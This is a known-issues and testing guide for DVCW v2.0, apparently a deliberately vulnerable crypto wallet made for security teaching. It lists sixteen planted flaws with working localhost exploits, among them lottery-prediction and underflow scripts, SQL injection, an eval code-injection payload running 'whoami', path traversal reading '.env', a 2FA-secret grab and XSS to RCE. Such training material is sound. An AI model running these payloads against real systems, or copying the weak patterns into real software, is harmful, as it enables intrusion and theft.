# Known Issues & Solutions for DVCW v2.0

## Better-sqlite3 Compatibility Issue

### Problem
better-sqlite3 v9.x has build issues with Node.js 20.11 on macOS.

### Workaround 1: Use Prebuilt Binary
```bash
cd web-api
npm install --ignore-scripts
```

This skips the rebuild and uses a prebuilt binary if available.

### Workaround 2: Use Older Node.js Version
If you must use better-sqlite3 v9.x, use Node.js 18.x:
```bash
# Install Node.js 18.x via nvm
nvm install 18
nvm use 18

# Then run web-api
cd web-api
npm install
npm start
```

### Workaround 3: Use Different Database (Recommended for Production)
For educational purposes, the current better-sqlite3 8.7.0 or 9.4.0 with `--ignore-scripts` should work.

The vulnerability (SQL injection) only requires the query to be vulnerable, not the database itself.

### Current Status
- ✅ Web API dependencies install with `--ignore-scripts` flag works
- ✅ All functionality should work normally
- ⚠️  Native module rebuild may fail on some systems

## Testing Notes

### Minimal Testing (Without Full Stack)
1. **Test Smart Contract Compilation:**
   ```bash
   cd blockchain
   npx truffle compile
   ```
   Expected: Compiled successfully with warnings

2. **Test Web API Dependencies:**
   ```bash
   cd web-api
   npm install --ignore-scripts
   ```
   Expected: Dependencies installed, may have some warnings

3. **Test Desktop App Dependencies:**
   ```bash
   cd desktop-app
   npm install
   ```
   Expected: Dependencies installed

4. **Run Basic Structure Check:**
   ```bash
   node test-basic.js
   ```
   Expected: All checks pass

### Full Stack Testing
To test the complete application:

1. **Start Backend Services:**
   ```bash
   make install
   ```
   Or start manually:
   ```bash
   # Terminal 1: Start ganache
   ganache --port 7545 --mnemonic "candy maple cake sugar pudding cream honey rich smooth crumble sweet treat" --database ./blockchain/bchain/prod

   # Terminal 2: Deploy contracts
   cd blockchain
   npx truffle migrate

   # Terminal 3: Start API
   cd web-api
   npm start
   ```

2. **Launch Desktop App:**
   ```bash
   # Terminal 4: Start desktop app
   cd desktop-app
   npm start
   ```

3. **Run Vulnerability Verification:**
   ```bash
   # Terminal 5: Verify vulnerabilities
   node verify-vulns.js
   ```

## Vulnerability Testing Guide

### Smart Contract Vulnerabilities

#### 1. Bad Randomness (Lottery.sol:26)
```javascript
// In truffle console
truffle(development)>

const lottery = await Lottery.deployed()

// Read seed from storage
const seed = await web3.eth.getStorageAt(lottery.address, 1)
console.log("Seed:", parseInt(seed))

// Get current block
const block = await web3.eth.getBlock('latest')
console.log("Block hash:", block.hash)
console.log("Timestamp:", block.timestamp)

// Calculate expected result (this is the vulnerability!)
const expected = parseInt(web3.utils.soliditySha3(
    block.hash,
    block.timestamp,
    seed
).slice(2, 4), 16)

console.log("Expected result:", expected)

// Bet on correct number
await lottery.bet(expected, { value: web3.utils.toWei('1', 'ether') })
```

#### 2. Reentrancy (Lottery.sol:40, Donations.sol:28)
```javascript
// In truffle console
const Lottery = artifacts.require("Lottery")
const instance = await Lottery.deployed()

// Create attacker contract that reenters
// (See Truffle documentation for reentrancy example)
```

#### 3. Integer Underflow (Donations.sol:27)
```javascript
// In truffle console
const Donations = artifacts.require("Donations")
const instance = await Donations.deployed()

// Donate 1 ETH
await instance.donate({ value: web3.utils.toWei('1', 'ether') })

// Try to withdraw MORE than 1 ETH (should underflow to huge number)
// This works because of the 'unchecked' block
await instance.withdrawDonation(
    accounts[0],
    web3.utils.toWei('999', 'ether')
)
```

#### 4. Private Seed (Lottery.sol:12)
```javascript
// In truffle console
const Lottery = artifacts.require("Lottery")
const instance = await Lottery.deployed()

// Read storage slot 1 (contains the private seed)
const seed = await web3.eth.getStorageAt(instance.address, 1)
console.log("Private seed:", seed) // = 87
```

#### 5. tx.origin (Donations.sol:53)
```javascript
// In truffle console
const Donations = artifacts.require("Donations")
const instance = await Donations.deployed()

// Create attacker contract
// Contract that calls instance.newOwner() will bypass tx.origin check
// because tx.origin = victim's address, not the contract's address
```

### Web API Vulnerabilities

#### 6. SQL Injection (data/index.js:94)
```bash
# Inject SQL to bypass authentication or extract data
curl "http://localhost:3000/wallets/' OR '1'='1"
```

#### 7. Code Injection (route/wallets.route.js:53)
```bash
# Execute arbitrary code via eval()
curl -X POST http://localhost:3000/wallets/walletId/change-password \
  -H "Content-Type: text/plain" \
  -d "['oldPass', require('child_process').exec('whoami').toString()]"
```

#### 8. Path Traversal (config.ctrl.js:14)
```bash
# Read arbitrary files from server
curl "http://localhost:3000/config?f=../../package.json"
curl "http://localhost:3000/config?f=../../.env"
```

#### 9. CORS Open (server.js:20)
```javascript
// From any origin (even evil.com)
fetch('http://localhost:3000/', {
  headers: { Origin: 'http://evil.com' }
})
```

#### 10. RC4 Encryption (wallets.ctrl.js:172)
```javascript
// The code uses RC4 with createCipheriv
// RC4 is broken and easily decrypted
// This is intentionally weak for educational purposes
```

#### 11. MD5 Hashing (wallets.ctrl.js:21)
```javascript
// MD5 is collision-prone and should never be used for security
// Intentionally weak for educational purposes
```

### Desktop App Vulnerabilities

#### 12. 2FA Bypass (main.js:278)
```bash
# Read localdata.json which contains the 2FA secret
cat ~/.config/dvcw-desktop-app/localdata.json | grep twoFactorAuthKey

# Use the secret to generate valid OTP codes
# (See speakeasy documentation)
```

#### 13. Open Debug Port (main.js:15)
```bash
# Debug port 9334 is open and accessible via browser
# Vulnerable to DNS rebinding attacks
curl http://localhost:9334
```

#### 14. Protocol Handler (main.js:12, utils.js:78)
```bash
# Click a dvcw:// link and the app will open
# This can be exploited to perform actions on behalf of user
# See CVE-2018-1000118
```

#### 15. XSS to RCE (index.render.js)
```javascript
// Send transaction with XSS payload
// <script>alert(1)</script>
// Since nodeIntegration: true and contextIsolation: false,
// XSS can lead to Remote Code Execution (RCE)
```

#### 16. No Session Management (API design)
```bash
# API doesn't use authentication tokens or sessions
# Relies on walletId alone (which is just a SHA1 hash)
# Anyone with the walletId can perform actions
```

## Summary

All 16 vulnerabilities are preserved and documented. The application is ready for educational use with:
- Node.js 20.x
- Electron 30.x
- Solidity 0.8.19
- Vue 3
- Web3.js 4.x

The only known issue is better-sqlite3 compilation on some systems, which can be worked around with `--ignore-scripts` flag.
